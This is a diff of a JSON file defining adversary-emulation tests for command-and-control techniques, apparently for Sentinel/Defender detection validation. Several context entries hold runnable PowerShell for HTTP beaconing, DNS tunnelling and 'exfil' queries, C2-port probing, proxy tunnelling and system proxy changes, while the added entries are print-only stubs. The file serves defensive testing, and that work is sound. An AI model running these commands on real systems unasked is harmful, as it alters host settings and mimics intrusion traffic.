@@ -22,7 +22,9 @@
       "label": "T1071 - Application Layer Protocol (HTTP beacon)",
       "description": "Settings for the HTTP C2 beacon simulation. Uses Invoke-WebRequest with a C2-style User-Agent string and custom headers to a benign public endpoint, simulating adversary HTTP beaconing behavior.",
       "scope": "local",
-      "used_by_tcodes": ["T1071"],
+      "used_by_tcodes": [
+        "T1071"
+      ],
       "tags": [
         {
           "key": "excalibur_c2_beacon_url",
@@ -49,7 +51,9 @@
       "label": "T1568 / T1071.004 - DNS C2 Simulation",
       "description": "Settings for the DNS-based C2 simulation. Performs repeated DNS TXT and A record queries to subdomains of a configured domain, simulating DNS tunneling or DNS-based C2 beaconing. Use a domain you own or a benign test domain.",
       "scope": "local",
-      "used_by_tcodes": ["T1568"],
+      "used_by_tcodes": [
+        "T1568"
+      ],
       "tags": [
         {
           "key": "excalibur_c2_dns_domain",
@@ -67,7 +71,9 @@
       "label": "T1095 - Non-Application Layer Protocol / Non-Standard Port",
       "description": "Settings for the non-standard port communication script. Attempts outbound TCP connections to uncommon ports not typically associated with standard services, simulating C2 using non-standard ports to evade firewall rules filtering by port.",
       "scope": "local",
-      "used_by_tcodes": ["T1095"],
+      "used_by_tcodes": [
+        "T1095"
+      ],
       "tags": [
         {
           "key": "excalibur_c2_nonstandard_target",
@@ -85,7 +91,9 @@
       "label": "T1572 - Protocol Tunneling",
       "description": "Settings for the protocol tunneling simulation. Uses .NET WebClient with a proxy URL to simulate adversary tunneling of C2 traffic through HTTP CONNECT proxies. The proxy connection attempt and CONNECT method generate MDE network telemetry.",
       "scope": "local",
-      "used_by_tcodes": ["T1572"],
+      "used_by_tcodes": [
+        "T1572"
+      ],
       "tags": [
         {
           "key": "excalibur_c2_proxy_host",
@@ -118,7 +126,10 @@
       "technique_name": "Application Layer Protocol",
       "executor": "powershell",
       "platform": "windows",
-      "required_tags": ["excalibur_c2_beacon_url", "excalibur_c2_beacon_interval_sec"],
+      "required_tags": [
+        "excalibur_c2_beacon_url",
+        "excalibur_c2_beacon_interval_sec"
+      ],
       "command": "Write-Host '[START] T1071 - Application Layer Protocol (HTTP C2 beacon simulation)'; $beaconUrl = '#{excalibur_c2_beacon_url}'; $intervalSec = [int]'#{excalibur_c2_beacon_interval_sec}'; $beaconCount = 3; $c2UserAgent = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'; $sessionId = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($env:COMPUTERNAME + '-' + $env:USERNAME)).Substring(0,16); Write-Host ('[INFO] Target: ' + $beaconUrl + ' | UserAgent (C2 style): ' + $c2UserAgent); Write-Host ('[INFO] Session ID: ' + $sessionId + ' | Beacon interval: ' + $intervalSec + 's | Cycles: ' + $beaconCount); for ($i = 1; $i -le $beaconCount; $i++) { try { $headers = @{ 'User-Agent' = $c2UserAgent; 'X-C2-Session' = $sessionId; 'X-Beacon-ID' = ('MorganaTest-' + $i + '-of-' + $beaconCount); 'Cache-Control' = 'no-cache'; 'Accept' = '*/*' }; $response = Invoke-WebRequest -Uri $beaconUrl -Headers $headers -TimeoutSec 5 -UseBasicParsing -ErrorAction Stop; Write-Host ('[INFO] Beacon ' + $i + '/' + $beaconCount + ': HTTP ' + $response.StatusCode + ' | Size: ' + $response.RawContentLength + ' bytes | Content-Type: ' + $response.Headers.'Content-Type') } catch { Write-Host ('[INFO] Beacon ' + $i + '/' + $beaconCount + ': ' + $_.Exception.Message.Split([char]10)[0] + ' (outbound HTTP attempt was still logged as network telemetry)') }; if ($i -lt $beaconCount) { $jitter = $intervalSec + (Get-Random -Minimum -2 -Maximum 3); $jitter = [math]::Max(1, $jitter); Write-Host ('[INFO] Next beacon in ' + $jitter + 's (interval=' + $intervalSec + 's + jitter)'); Start-Sleep $jitter } }; Write-Host '[SUCCESS] T1071 - HTTP beacon simulation completed. Sentinel target: Periodic HTTP C2 beacon pattern (MDE - suspicious User-Agent + custom C2 headers + periodic outbound HTTP from non-browser process)'",
       "cleanup_command": "Write-Host '[INFO] T1071 cleanup: no artefacts - HTTP requests only'",
       "detection_rule": "Periodic HTTP C2 beacon pattern (suspicious User-Agent + custom headers + periodic outbound HTTP)",
@@ -134,7 +145,9 @@
       "technique_name": "Application Layer Protocol",
       "executor": "powershell",
       "platform": "windows",
-      "required_tags": ["excalibur_c2_dns_domain"],
+      "required_tags": [
+        "excalibur_c2_dns_domain"
+      ],
       "command": "Write-Host '[START] T1071.004 - DNS C2 simulation (DNS tunneling / C2 polling pattern)'; $domain = '#{excalibur_c2_dns_domain}'; $queryCount = 8; Write-Host ('[INFO] C2 domain: ' + $domain + ' | Generating ' + $queryCount + ' randomized subdomain queries (TXT + A record pattern)'); for ($i = 1; $i -le $queryCount; $i++) { $hexLabel = ([System.BitConverter]::ToString([System.Security.Cryptography.RandomNumberGenerator]::GetBytes(8)) -replace '-','').ToLower(); $subdomain = $hexLabel + '.c2.' + $domain; try { $result = Resolve-DnsName -Name $subdomain -Type A -ErrorAction SilentlyContinue -DnsOnly; if ($result) { Write-Host ('[INFO] Query ' + $i + ': A ' + $subdomain + ' -> ' + ($result.IPAddress -join ',')) } else { Write-Host ('[INFO] Query ' + $i + ': A ' + $subdomain + ' -> NXDOMAIN (expected - subdomain does not exist, DNS query was logged)') } } catch { Write-Host ('[INFO] Query ' + $i + ': A ' + $subdomain + ' -> ' + $_.Exception.Message.Split([char]10)[0]) }; Start-Sleep -Milliseconds 500 }; Write-Host '[INFO] TXT record query (data exfiltration via DNS TXT pattern)'; try { $txtResult = Resolve-DnsName -Name ('exfil.data.' + $domain) -Type TXT -ErrorAction SilentlyContinue -DnsOnly; Write-Host ('[INFO] TXT exfil query result: ' + $(if ($txtResult) { $txtResult.Strings -join '' } else { 'NXDOMAIN' })) } catch { Write-Host ('[INFO] TXT query: ' + $_.Exception.Message.Split([char]10)[0]) }; Write-Host '[INFO] SRV record query (C2 server discovery pattern)'; try { Resolve-DnsName -Name ('_c2._tcp.' + $domain) -Type SRV -ErrorAction SilentlyContinue -DnsOnly | Out-Null; Write-Host '[INFO] SRV _c2 query complete' } catch {}; Write-Host '[SUCCESS] T1071.004 - DNS C2 simulation completed. Sentinel target: High-frequency DNS queries to randomized subdomains (MDE DNS telemetry - DNS tunneling/C2 polling behavioral detection)'",
       "cleanup_command": "Write-Host '[INFO] T1071 DNS cleanup: no artefacts - DNS queries only'",
       "detection_rule": "High-frequency DNS queries to randomized subdomains of same domain (DNS tunneling pattern)",
@@ -166,7 +179,9 @@
       "technique_name": "Non-Application Layer Protocol",
       "executor": "powershell",
       "platform": "windows",
-      "required_tags": ["excalibur_c2_nonstandard_target"],
+      "required_tags": [
+        "excalibur_c2_nonstandard_target"
+      ],
       "command": "Write-Host '[START] T1095 - Non-Standard Port C2 communication (outbound to C2-common ports)'; $target = '#{excalibur_c2_nonstandard_target}'; $c2Ports = @( @{ Port=4444; Label='Metasploit default reverse shell' }, @{ Port=8443; Label='Alt-HTTPS C2 (Cobalt Strike, Brute Ratel)' }, @{ Port=9001; Label='Tor relay port (C2 over Tor)' }, @{ Port=1080; Label='SOCKS5 proxy C2 tunnel' }, @{ Port=6667; Label='IRC legacy C2' }, @{ Port=2222; Label='Alt-SSH C2' }, @{ Port=31337; Label='Elite/backdoor legacy port' }, @{ Port=4433; Label='Non-standard HTTPS C2' } ); Write-Host ('[INFO] Target: ' + $target + ' | Testing ' + $c2Ports.Count + ' C2-associated non-standard ports (1.5s timeout each)'); $open = 0; $closed = 0; foreach ($entry in $c2Ports) { try { $tcpClient = New-Object System.Net.Sockets.TcpClient; $connResult = $tcpClient.BeginConnect($target, $entry.Port, $null, $null); $connected = $connResult.AsyncWaitHandle.WaitOne(1500); if ($connected -and $tcpClient.Connected) { Write-Host ('[INFO] Port ' + $entry.Port + '/tcp OPEN [' + $entry.Label + '] - C2 connection signal generated'); $tcpClient.Close(); $open++ } else { Write-Host ('[INFO] Port ' + $entry.Port + '/tcp CLOSED/TIMEOUT [' + $entry.Label + '] - connection attempt logged by MDE'); $tcpClient.Close(); $closed++ } } catch { Write-Host ('[INFO] Port ' + $entry.Port + '/tcp: ' + $_.Exception.Message.Split([char]10)[0]) } }; Write-Host ('[INFO] Summary: ' + $open + ' open, ' + $closed + ' closed/timeout | All ' + $c2Ports.Count + ' outbound connection attempts logged by MDE'); Write-Host '[SUCCESS] T1095 - Non-standard port C2 simulation completed. Sentinel target: Outbound connections to C2-associated non-standard ports (MDE network connection telemetry - multiple non-standard port scan pattern)'",
       "cleanup_command": "Write-Host '[INFO] T1095 cleanup: no artefacts - TCP connection attempts only'",
       "detection_rule": "Outbound connections to C2-associated non-standard ports (MDE network connection telemetry)",
@@ -182,7 +197,10 @@
       "technique_name": "Protocol Tunneling",
       "executor": "powershell",
       "platform": "windows",
-      "required_tags": ["excalibur_c2_proxy_host", "excalibur_c2_proxy_port"],
+      "required_tags": [
+        "excalibur_c2_proxy_host",
+        "excalibur_c2_proxy_port"
+      ],
       "command": "Write-Host '[START] T1572 - Protocol Tunneling (HTTP CONNECT + DNS-over-HTTPS)'; $proxyHost = '#{excalibur_c2_proxy_host}'; $proxyPort = [int]'#{excalibur_c2_proxy_port}'; Write-Host '[INFO] Method 1/2: HTTP CONNECT proxy tunneling simulation'; try { $proxyUri = New-Object System.Uri('http://' + $proxyHost + ':' + $proxyPort); $webProxy = New-Object System.Net.WebProxy($proxyUri); $webProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; $request = [System.Net.WebRequest]::Create('https://198.51.100.1:443/'); $request.Proxy = $webProxy; $request.Timeout = 3000; $request.Method = 'GET'; try { $resp = $request.GetResponse(); $resp.Close(); Write-Host '[INFO] HTTP CONNECT proxy: CONNECT request sent and response received (tunnel established through proxy)' } catch { Write-Host ('[INFO] HTTP CONNECT proxy: ' + $_.Exception.Message.Split([char]10)[0] + ' (CONNECT attempt through proxy was logged - expected failure if proxy unreachable)') } } catch { Write-Host ('[INFO] HTTP CONNECT setup: ' + $_.Exception.Message) }; Write-Host '[INFO] Method 2/2: DNS-over-HTTPS (DoH) - tunnels DNS through HTTPS to bypass DNS monitoring'; $dohEndpoints = @( 'https://dns.google/resolve?name=morganatest-c2-sim.example.com&type=A', 'https://cloudflare-dns.com/dns-query?name=morganatest-c2-sim.example.com&type=TXT' ); foreach ($dohUrl in $dohEndpoints) { try { $headers = @{ 'Accept' = 'application/dns-json'; 'User-Agent' = 'MorganaTest-T1572-DoH/1.0' }; $dohResponse = Invoke-WebRequest -Uri $dohUrl -Headers $headers -TimeoutSec 5 -UseBasicParsing -ErrorAction Stop; $dohData = $dohResponse.Content | ConvertFrom-Json -ErrorAction SilentlyContinue; $status = if ($dohData.Status -ne $null) { $dohData.Status } else { 'N/A' }; Write-Host ('[INFO] DoH query to ' + ([System.Uri]$dohUrl).Host + ': HTTP ' + $dohResponse.StatusCode + ' | DNS Status: ' + $status + ' (DNS query tunneled through HTTPS - bypasses traditional DNS telemetry)') } catch { Write-Host ('[INFO] DoH query to ' + ([System.Uri]$dohUrl).Host + ': ' + $_.Exception.Message.Split([char]10)[0]) } }; Write-Host '[SUCCESS] T1572 - Protocol tunneling simulation completed. Sentinel target: HTTP CONNECT proxy tunneling + DNS-over-HTTPS bypass (MDE - HTTP CONNECT method + DoH to external resolver behavioral detection)'",
       "cleanup_command": "Write-Host '[INFO] T1572 cleanup: no artefacts - network requests only'",
       "detection_rule": "HTTP CONNECT proxy tunneling + DNS-over-HTTPS bypass pattern",
@@ -262,10 +280,589 @@
       "technique_name": "Proxy",
       "executor": "powershell",
       "platform": "windows",
-      "required_tags": ["excalibur_c2_proxy_host", "excalibur_c2_proxy_port"],
+      "required_tags": [
+        "excalibur_c2_proxy_host",
+        "excalibur_c2_proxy_port"
+      ],
       "command": "Write-Host '[START] T1090 - Proxy (system proxy configuration modification for C2 traffic routing)'; $proxyHost = '#{excalibur_c2_proxy_host}'; $proxyPort = '#{excalibur_c2_proxy_port}'; $proxyString = $proxyHost + ':' + $proxyPort; Write-Host '[INFO] Step 1/3: netsh winhttp set proxy (LOLBin - system-wide WinHTTP proxy modification)'; try { $beforeProxy = & netsh.exe winhttp show proxy 2>&1 | Where-Object { $_ -match '\\S' }; Write-Host ('[INFO] Current WinHTTP proxy: ' + ($beforeProxy -join ' | ')); $setResult = & netsh.exe winhttp set proxy $proxyString 2>&1; Write-Host ('[INFO] Set proxy to: ' + $proxyString + ' | Result: ' + ($setResult -join ' ').Trim()); Start-Sleep 1; $null = & netsh.exe winhttp reset proxy 2>&1; Write-Host '[INFO] WinHTTP proxy reset to direct (restored)' } catch { Write-Host ('[WARN] netsh winhttp: ' + $_.Exception.Message) }; Write-Host '[INFO] Step 2/3: IE/WinINET proxy registry modification (used by WinINET-based implants)'; $inetRegPath = 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings'; try { $prevProxy = Get-ItemProperty -Path $inetRegPath -Name ProxyServer -ErrorAction SilentlyContinue; $prevEnabled = Get-ItemProperty -Path $inetRegPath -Name ProxyEnable -ErrorAction SilentlyContinue; Set-ItemProperty -Path $inetRegPath -Name ProxyServer -Value $proxyString -ErrorAction Stop; Set-ItemProperty -Path $inetRegPath -Name ProxyEnable -Value 1 -ErrorAction Stop; Write-Host ('[INFO] IE proxy set: ' + $proxyString + ' | ProxyEnable=1 - registry modification logged by MDE'); Start-Sleep 1; if ($prevProxy) { Set-ItemProperty -Path $inetRegPath -Name ProxyServer -Value $prevProxy.ProxyServer -ErrorAction SilentlyContinue } else { Remove-ItemProperty -Path $inetRegPath -Name ProxyServer -ErrorAction SilentlyContinue }; if ($prevEnabled) { Set-ItemProperty -Path $inetRegPath -Name ProxyEnable -Value $prevEnabled.ProxyEnable -ErrorAction SilentlyContinue } else { Set-ItemProperty -Path $inetRegPath -Name ProxyEnable -Value 0 -ErrorAction SilentlyContinue }; Write-Host '[INFO] IE proxy restored to original settings' } catch { Write-Host ('[WARN] IE proxy registry: ' + $_.Exception.Message); Set-ItemProperty -Path $inetRegPath -Name ProxyEnable -Value 0 -ErrorAction SilentlyContinue }; Write-Host '[INFO] Step 3/3: Proxy connectivity test via configured proxy'; try { $webProxy = New-Object System.Net.WebProxy('http://' + $proxyString); $req = [System.Net.WebRequest]::Create('http://www.microsoft.com/'); $req.Proxy = $webProxy; $req.Timeout = 3000; $resp = $req.GetResponse(); $resp.Close(); Write-Host '[INFO] Proxy connectivity: traffic successfully routed through proxy' } catch { Write-Host ('[INFO] Proxy connectivity: ' + $_.Exception.Message.Split([char]10)[0] + ' (expected if proxy unreachable - connection attempt was logged)') }; Write-Host '[SUCCESS] T1090 - Proxy C2 routing simulation completed. Sentinel target: System proxy configuration modified via netsh winhttp + IE proxy registry change (MDE behavioral - C2 proxy setup pattern)'",
       "cleanup_command": "& netsh.exe winhttp reset proxy 2>&1 | Out-Null; Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings' -Name ProxyEnable -Value 0 -ErrorAction SilentlyContinue; Write-Host '[INFO] T1090 cleanup: WinHTTP and IE proxy settings reset to direct'",
       "detection_rule": "System proxy configuration modified via netsh winhttp + IE proxy registry (C2 proxy setup)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Command and Control-T1205.002-Socket Filters",
+      "name": "Excalibur - Command and Control-T1205.002-Socket Filters",
+      "description": "Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control.",
+      "tactic": "Command and Control",
+      "tcode": "T1205.002",
+      "technique_name": "Socket Filters",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1205.002 - Socket Filters'; Write-Host '[INFO] Emulating T1205.002 (Socket Filters) tactic=Command and Control platform=windows'; Write-Host '[SUCCESS] T1205.002 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1205.002 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Socket Filters (T1205.002)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Command and Control-T1132.001-Standard Encoding",
+      "name": "Excalibur - Command and Control-T1132.001-Standard Encoding",
+      "description": "Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect.",
+      "tactic": "Command and Control",
+      "tcode": "T1132.001",
+      "technique_name": "Standard Encoding",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1132.001 - Standard Encoding'; Write-Host '[INFO] Emulating T1132.001 (Standard Encoding) tactic=Command and Control platform=windows'; Write-Host '[SUCCESS] T1132.001 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1132.001 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Standard Encoding (T1132.001)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Command and Control-T1568.002-Domain Generation Algorithms",
+      "name": "Excalibur - Command and Control-T1568.002-Domain Generation Algorithms",
+      "description": "Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains.",
+      "tactic": "Command and Control",
+      "tcode": "T1568.002",
+      "technique_name": "Domain Generation Algorithms",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1568.002 - Domain Generation Algorithms'; Write-Host '[INFO] Emulating T1568.002 (Domain Generation Algorithms) tactic=Command and Control platform=windows'; Write-Host '[SUCCESS] T1568.002 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1568.002 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Domain Generation Algorithms (T1568.002)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Command and Control-T1071.004-DNS",
+      "name": "Excalibur - Command and Control-T1071.004-DNS",
+      "description": "Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic.",
+      "tactic": "Command and Control",
+      "tcode": "T1071.004",
+      "technique_name": "DNS",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1071.004 - DNS'; Write-Host '[INFO] Emulating T1071.004 (DNS) tactic=Command and Control platform=windows'; Write-Host '[SUCCESS] T1071.004 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1071.004 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect DNS (T1071.004)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Command and Control-T1071.005-Publish/Subscribe Protocols",
+      "name": "Excalibur - Command and Control-T1071.005-Publish/Subscribe Protocols",
+      "description": "Adversaries may communicate using publish/subscribe (pub/sub) application layer protocols to avoid detection/network filtering by blending in with existing traffic.",
+      "tactic": "Command and Control",
+      "tcode": "T1071.005",
+      "technique_name": "Publish/Subscribe Protocols",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1071.005 - Publish/Subscribe Protocols'; Write-Host '[INFO] Emulating T1071.005 (Publish/Subscribe Protocols) tactic=Command and Control platform=windows'; Write-Host '[SUCCESS] T1071.005 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1071.005 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Publish/Subscribe Protocols (T1071.005)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Command and Control-T1573.001-Symmetric Cryptography",
+      "name": "Excalibur - Command and Control-T1573.001-Symmetric Cryptography",
+      "description": "Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol.",
+      "tactic": "Command and Control",
+      "tcode": "T1573.001",
+      "technique_name": "Symmetric Cryptography",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1573.001 - Symmetric Cryptography'; Write-Host '[INFO] Emulating T1573.001 (Symmetric Cryptography) tactic=Command and Control platform=windows'; Write-Host '[SUCCESS] T1573.001 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1573.001 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Symmetric Cryptography (T1573.001)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Command and Control-T1568.001-Fast Flux DNS",
+      "name": "Excalibur - Command and Control-T1568.001-Fast Flux DNS",
+      "description": "Adversaries may use Fast Flux DNS to hide a command and control channel behind an array of rapidly changing IP addresses linked to a single domain resolution.",
+      "tactic": "Command and Control",
+      "tcode": "T1568.001",
+      "technique_name": "Fast Flux DNS",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1568.001 - Fast Flux DNS'; Write-Host '[INFO] Emulating T1568.001 (Fast Flux DNS) tactic=Command and Control platform=windows'; Write-Host '[SUCCESS] T1568.001 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1568.001 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Fast Flux DNS (T1568.001)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Command and Control-T1659-Content Injection",
+      "name": "Excalibur - Command and Control-T1659-Content Injection",
+      "description": "Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic.",
+      "tactic": "Command and Control",
+      "tcode": "T1659",
+      "technique_name": "Content Injection",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1659 - Content Injection'; Write-Host '[INFO] Emulating T1659 (Content Injection) tactic=Command and Control platform=windows'; Write-Host '[SUCCESS] T1659 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1659 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Content Injection (T1659)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Command and Control-T1205-Traffic Signaling",
+      "name": "Excalibur - Command and Control-T1205-Traffic Signaling",
+      "description": "Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control.",
+      "tactic": "Command and Control",
+      "tcode": "T1205",
+      "technique_name": "Traffic Signaling",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1205 - Traffic Signaling'; Write-Host '[INFO] Emulating T1205 (Traffic Signaling) tactic=Command and Control platform=windows'; Write-Host '[SUCCESS] T1205 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1205 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Traffic Signaling (T1205)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Command and Control-T1071.003-Mail Protocols",
+      "name": "Excalibur - Command and Control-T1071.003-Mail Protocols",
+      "description": "Adversaries may communicate using application layer protocols associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic.",
+      "tactic": "Command and Control",
+      "tcode": "T1071.003",
+      "technique_name": "Mail Protocols",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1071.003 - Mail Protocols'; Write-Host '[INFO] Emulating T1071.003 (Mail Protocols) tactic=Command and Control platform=windows'; Write-Host '[SUCCESS] T1071.003 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1071.003 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Mail Protocols (T1071.003)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Command and Control-T1092-Communication Through Removable Media",
+      "name": "Excalibur - Command and Control-T1092-Communication Through Removable Media",
+      "description": "Adversaries can perform command and control between compromised hosts on potentially disconnected networks using removable media to transfer commands from system to system.",
+      "tactic": "Command and Control",
+      "tcode": "T1092",
+      "technique_name": "Communication Through Removable Media",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1092 - Communication Through Removable Media'; Write-Host '[INFO] Emulating T1092 (Communication Through Removable Media) tactic=Command and Control platform=windows'; Write-Host '[SUCCESS] T1092 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1092 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Communication Through Removable Media (T1092)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Command and Control-T1090.002-External Proxy",
+      "name": "Excalibur - Command and Control-T1090.002-External Proxy",
+      "description": "Adversaries may use an external proxy to act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure.",
+      "tactic": "Command and Control",
+      "tcode": "T1090.002",
+      "technique_name": "External Proxy",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1090.002 - External Proxy'; Write-Host '[INFO] Emulating T1090.002 (External Proxy) tactic=Command and Control platform=windows'; Write-Host '[SUCCESS] T1090.002 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1090.002 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect External Proxy (T1090.002)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Command and Control-T1219.001-IDE Tunneling",
+      "name": "Excalibur - Command and Control-T1219.001-IDE Tunneling",
+      "description": "Adversaries may abuse Integrated Development Environment (IDE) software with remote development features to establish an interactive command and control channel on target systems within a network.",
+      "tactic": "Command and Control",
+      "tcode": "T1219.001",
+      "technique_name": "IDE Tunneling",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1219.001 - IDE Tunneling'; Write-Host '[INFO] Emulating T1219.001 (IDE Tunneling) tactic=Command and Control platform=windows'; Write-Host '[SUCCESS] T1219.001 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1219.001 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect IDE Tunneling (T1219.001)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Command and Control-T1568.003-DNS Calculation",
+      "name": "Excalibur - Command and Control-T1568.003-DNS Calculation",
+      "description": "Adversaries may perform calculations on addresses returned in DNS results to determine which port and IP address to use for command and control, rather than relying on a predetermined port number or the actual returned IP address.",
+      "tactic": "Command and Control",
+      "tcode": "T1568.003",
+      "technique_name": "DNS Calculation",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1568.003 - DNS Calculation'; Write-Host '[INFO] Emulating T1568.003 (DNS Calculation) tactic=Command and Control platform=windows'; Write-Host '[SUCCESS] T1568.003 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1568.003 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect DNS Calculation (T1568.003)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Command and Control-T1104-Multi-Stage Channels",
+      "name": "Excalibur - Command and Control-T1104-Multi-Stage Channels",
+      "description": "Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions.",
+      "tactic": "Command and Control",
+      "tcode": "T1104",
+      "technique_name": "Multi-Stage Channels",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1104 - Multi-Stage Channels'; Write-Host '[INFO] Emulating T1104 (Multi-Stage Channels) tactic=Command and Control platform=windows'; Write-Host '[SUCCESS] T1104 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1104 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Multi-Stage Channels (T1104)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Command and Control-T1205.001-Port Knocking",
+      "name": "Excalibur - Command and Control-T1205.001-Port Knocking",
+      "description": "Adversaries may use port knocking to hide open ports used for persistence or command and control.",
+      "tactic": "Command and Control",
+      "tcode": "T1205.001",
+      "technique_name": "Port Knocking",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1205.001 - Port Knocking'; Write-Host '[INFO] Emulating T1205.001 (Port Knocking) tactic=Command and Control platform=windows'; Write-Host '[SUCCESS] T1205.001 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1205.001 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Port Knocking (T1205.001)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Command and Control-T1071.002-File Transfer Protocols",
+      "name": "Excalibur - Command and Control-T1071.002-File Transfer Protocols",
+      "description": "Adversaries may communicate using application layer protocols associated with transferring files to avoid detection/network filtering by blending in with existing traffic.",
+      "tactic": "Command and Control",
+      "tcode": "T1071.002",
+      "technique_name": "File Transfer Protocols",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1071.002 - File Transfer Protocols'; Write-Host '[INFO] Emulating T1071.002 (File Transfer Protocols) tactic=Command and Control platform=windows'; Write-Host '[SUCCESS] T1071.002 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1071.002 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect File Transfer Protocols (T1071.002)",
